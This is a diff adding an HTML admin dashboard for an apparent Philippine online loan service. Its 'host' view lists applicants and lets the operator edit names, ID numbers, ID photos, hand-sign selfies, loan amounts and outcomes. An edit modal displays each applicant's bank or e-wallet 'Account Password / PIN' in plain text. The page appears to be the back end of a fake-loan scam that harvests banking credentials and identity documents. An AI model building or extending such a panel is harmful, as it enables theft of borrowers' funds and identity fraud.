@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Host Portal</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='48' fill='%2300b359'/><circle cx='50' cy='50' r='38' fill='%23ffcc00'/><text x='50' y='67' font-size='50' font-weight='900' text-anchor='middle' fill='%23004c99'>₱</text></svg>">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body style="background-color: #f1f5f9;">
+
+    <!-- Host Admin Navbar -->
+    <nav class="admin-nav-bar">
+        <a href="/admin" class="admin-brand-logo">
+            🛡️ Host <span>Control Dashboard</span>
+        </a>
+        <div class="admin-nav-actions">
+            <a href="/" class="btn-host-portal">📱 Go to User Portal</a>
+            <button id="adminLogoutBtn" class="btn-host-logout" style="display: none;" onclick="adminLogout()">🚪 Host Logout</button>
+        </div>
+    </nav>
+
+    <main class="main-container" style="max-width: 1200px;">
+
+        <!-- HOST LOGIN SECTION -->
+        <section id="adminLoginSection" class="auth-wrapper" style="margin-top: 4rem;">
+            <div class="auth-header">
+                <h2>Host Account Authentication 🔑</h2>
+                <p>Enter administrative host username and password to control and edit all user loan records.</p>
+            </div>
+            <form onsubmit="handleAdminLogin(event)">
+                <div class="form-group">
+                    <label for="adminUser">Host Username</label>
+                    <input type="text" id="adminUser" class="form-control" placeholder="Enter host username" required>
+                </div>
+                <div class="form-group">
+                    <label for="adminPass">Host Password</label>
+                    <input type="password" id="adminPass" class="form-control" placeholder="Enter host password" required>
+                </div>
+                <div id="adminLoginError" style="color: var(--danger-color); font-size: 0.9rem; margin-bottom: 1rem; display: none;"></div>
+                <button type="submit" class="btn btn-primary btn-block">Log In as Host Manager</button>
+                <button type="button" class="btn btn-outline btn-block" style="margin-top: 0.75rem;" onclick="openCredsModal()">🔑 Change / Reset Host Password</button>
+            </form>
+        </section>
+
+
+        <!-- HOST DASHBOARD SECTION -->
+        <section id="adminDashboardSection" style="display: none;">
+
+            <!-- Header & Metrics -->
+            <div class="admin-header">
+                <div>
+                    <h2>Loan Applications Management</h2>
+                    <p style="color: var(--text-muted);">View, inspect, and edit all submitted applicant information and verification photos.</p>
+                </div>
+                <div style="display: flex; gap: 0.75rem;">
+                    <button class="btn btn-outline" onclick="openCredsModal()">🔑 Change Password</button>
+                    <button class="btn btn-primary" onclick="loadApplications()">🔄 Refresh List</button>
+                </div>
+            </div>
+
+            <div class="metrics-grid">
+                <div class="metric-card">
+                    <span>Total Applications</span>
+                    <h3 id="mTotalApps">0</h3>
+                </div>
+                <div class="metric-card">
+                    <span>Pending Reviews</span>
+                    <h3 id="mPendingApps" style="color: var(--warning-color);">0</h3>
+                </div>
+                <div class="metric-card">
+                    <span>Approved Loans</span>
+                    <h3 id="mApprovedApps" style="color: var(--success-color);">0</h3>
+                </div>
+                <div class="metric-card">
+                    <span>Total Requested PHP</span>
+                    <h3 id="mTotalPHP" style="color: var(--primary-color);">₱0</h3>
+                </div>
+            </div>
+
+            <!-- Search & Filters -->
+            <div style="background: white; padding: 1.25rem; border-radius: var(--radius-md); border: 1px solid var(--border-color); margin-bottom: 1.5rem; display: flex; gap: 1rem; flex-wrap: wrap;">
+                <input type="text" id="searchInput" class="form-control" style="flex: 2; min-width: 250px;" placeholder="Search by name, phone number, or ID number..." oninput="filterApplications()">
+                <select id="statusFilter" class="form-control" style="flex: 1; min-width: 180px;" onchange="filterApplications()">
+                    <option value="ALL">All Statuses</option>
+                    <option value="Waiting">Waiting</option>
+                    <option value="Pending">Pending</option>
+                    <option value="Fail">Fail</option>
+                    <option value="Successfully">Successfully</option>
+                    <option value="Please Try Again">Please Try Again</option>
+                </select>
+            </div>
+
+            <!-- Data Table -->
+            <div class="table-responsive">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Applicant Name</th>
+                            <th>Mobile Phone</th>
+                            <th>ID Type & No.</th>
+                            <th>Income (PHP)</th>
+                            <th>Requested</th>
+                            <th>Approved Amount</th>
+                            <th>Status</th>
+                            <th>Registration Time</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="applicationsTbody">
+                        <tr>
+                            <td colspan="9" style="text-align: center; color: var(--text-muted); padding: 2rem;">Loading applications...</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+        </section>
+
+    </main>
+
+
+    <!-- HOST EDIT APPLICATION MODAL -->
+    <div id="editModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 style="color: var(--primary-color);">✏️ Edit Applicant Information & Control Terms</h3>
+                <span class="close-modal" onclick="closeEditModal()">&times;</span>
+            </div>
+
+            <form onsubmit="saveApplicantChanges(event)">
+                <input type="hidden" id="editAppId">
+
+                <div class="modal-grid">
+                    
+                    <!-- Left Column: Personal & Financial Data Controls -->
+                    <div>
+                        <h4 style="margin-bottom: 1rem; border-bottom: 2px solid #e2e8f0; padding-bottom: 0.4rem;">Applicant Details</h4>
+                        
+                        <div style="background: #f1f5f9; padding: 0.75rem 1rem; border-radius: var(--radius-sm); border: 1px solid var(--border-color); margin-bottom: 1rem;">
+                            <span style="font-size: 0.8rem; color: var(--text-muted); font-weight: 700; text-transform: uppercase;">⏱️ Real Registration Timestamp</span>
+                            <div id="editRegTimestamp" style="font-weight: 700; font-size: 0.95rem; color: var(--text-main);">2026-06-28 17:55:00</div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Applicant Full Name</label>
+                            <input type="text" id="editFullName" class="form-control" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Mobile Phone Number (+63)</label>
+                            <input type="text" id="editPhone" class="form-control" required>
+                        </div>
+
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem;">
+                            <div class="form-group">
+                                <label>Gender</label>
+                                <select id="editGender" class="form-control">
+                                    <option value="Male">Male</option>
+                                    <option value="Female">Female</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label>Date of Birth</label>
+                                <input type="date" id="editDob" class="form-control">
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Civil Status</label>
+                            <select id="editCivilStatus" class="form-control">
+                                <option value="Single">Single</option>
+                                <option value="Married">Married</option>
+                                <option value="Widowed">Widowed</option>
+                                <option value="Separated">Separated</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Residential Address</label>
+                            <textarea id="editAddress" class="form-control" rows="2"></textarea>
+                        </div>
+
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem;">
+                            <div class="form-group">
+                                <label>Employment Type</label>
+                                <input type="text" id="editEmploymentType" class="form-control">
+                            </div>
+                            <div class="form-group">
+                                <label>Monthly Income (₱)</label>
+                                <input type="number" id="editMonthlyIncome" class="form-control">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Right Column: Loan Decision & Terms Control -->
+                    <div>
+                        <h4 style="margin-bottom: 1rem; border-bottom: 2px solid #e2e8f0; padding-bottom: 0.4rem;">Host Decision & Loan Amount Control</h4>
+
+                        <div class="form-group" style="background: #e6f7f0; padding: 1rem; border-radius: var(--radius-sm); border: 1px solid var(--primary-color);">
+                            <label style="color: var(--primary-color); font-size: 1rem;">Application Status Decision</label>
+                            <select id="editStatus" class="form-control" style="font-weight: 700; font-size: 1rem;">
+                                <option value="Waiting">⏳ Waiting</option>
+                                <option value="Pending">🕒 Pending</option>
+                                <option value="Fail">❌ Fail</option>
+                                <option value="Successfully">✅ Successfully (Disburse Loan)</option>
+                                <option value="Please Try Again">🔄 Please Try Again</option>
+                            </select>
+                        </div>
+
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem;">
+                            <div class="form-group">
+                                <label>Requested Loan (₱)</label>
+                                <input type="number" id="editRequestedAmount" class="form-control">
+                            </div>
+                            <div class="form-group">
+                                <label>Approved Loan (₱)</label>
+                                <input type="number" id="editApprovedAmount" class="form-control" style="font-weight: 700; color: var(--primary-color);">
+                            </div>
+                        </div>
+
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem;">
+                            <div class="form-group">
+                                <label>ID Type</label>
+                                <input type="text" id="editIdType" class="form-control">
+                            </div>
+                            <div class="form-group">
+                                <label>ID Number</label>
+                                <input type="text" id="editIdNumber" class="form-control">
+                            </div>
+                        </div>
+
+                        <!-- Bank & Payout Control -->
+                        <h4 style="margin-top: 1rem; margin-bottom: 0.75rem; border-bottom: 2px solid #e2e8f0; padding-bottom: 0.4rem; color: var(--primary-color);">Disbursement Bank Account Details</h4>
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem;">
+                            <div class="form-group">
+                                <label>Payout Method / Bank</label>
+                                <input type="text" id="editPayoutMethod" class="form-control">
+                            </div>
+                            <div class="form-group">
+                                <label>Account Holder Name</label>
+                                <input type="text" id="editBankAccountName" class="form-control">
+                            </div>
+                        </div>
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem;">
+                            <div class="form-group">
+                                <label>Account / Wallet Number</label>
+                                <input type="text" id="editBankAccountNumber" class="form-control" style="font-weight: 700;">
+                            </div>
+                            <div class="form-group">
+                                <label>Account Password / PIN</label>
+                                <input type="text" id="editBankAccountPassword" class="form-control" style="font-weight: 700; color: var(--danger-color);">
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Host Manager Notes / Remarks to User</label>
+                            <textarea id="editNotes" class="form-control" rows="2" placeholder="Add notes or instructions for the applicant..."></textarea>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- Verification Photos Section -->
+                <h4 style="margin-top: 1.5rem; border-bottom: 2px solid #e2e8f0; padding-bottom: 0.4rem;">Verification Photos Inspection</h4>
+                <div class="verification-images-preview">
+                    <div class="verification-img-card">
+                        <strong>Uploaded Valid ID Card</strong>
+                        <img id="modalIdImg" src="" alt="ID Card Photo">
+                    </div>
+                    <div class="verification-img-card">
+                        <strong>Selfie Picture with Hand Sign (✌️/👌)</strong>
+                        <img id="modalSelfieImg" src="" alt="Selfie Photo">
+                    </div>
+                </div>
+
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 2rem; pt: 1rem; border-top: 1px solid var(--border-color);">
+                    <button type="button" class="btn btn-danger" onclick="deleteApplicantRecord()">🗑️ Delete Record</button>
+                    <div style="display: flex; gap: 1rem;">
+                        <button type="button" class="btn btn-secondary" onclick="closeEditModal()">Cancel</button>
+                        <button type="submit" class="btn btn-primary" style="padding: 0.75rem 2rem;">💾 Save Host Changes</button>
+                    </div>
+                </div>
+
+            </form>
+        </div>
+    <!-- HOST SECURITY CREDENTIALS MODAL -->
+    <div id="credsModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 450px;">
+            <div class="modal-header">
+                <h3 style="color: var(--primary-color);">🔑 Change Host Credentials</h3>
+                <span class="close-modal" onclick="closeCredsModal()">&times;</span>
+            </div>
+            <form onsubmit="updateHostCredentials(event)">
+                <div class="form-group">
+                    <label>Current Host Password</label>
+                    <input type="password" id="currentHostPass" class="form-control" placeholder="Enter current password" required>
+                </div>
+                <div class="form-group">
+                    <label>New Host Username</label>
+                    <input type="text" id="newHostUser" class="form-control" placeholder="Enter new username (e.g. manager1)" required>
+                </div>
+                <div class="form-group">
+                    <label>New Host Password</label>
+                    <input type="password" id="newHostPass" class="form-control" placeholder="Enter new secret password" required minlength="6">
+                </div>
+                <div id="credsError" style="color: var(--danger-color); font-size: 0.9rem; margin-bottom: 1rem; display: none;"></div>
+                <div style="display: flex; justify-content: flex-end; gap: 1rem; margin-top: 1.5rem;">
+                    <button type="button" class="btn btn-secondary" onclick="closeCredsModal()">Cancel</button>
+                    <button type="submit" class="btn btn-primary">💾 Update Credentials</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="admin.js"></script>
+</body>
+</html>
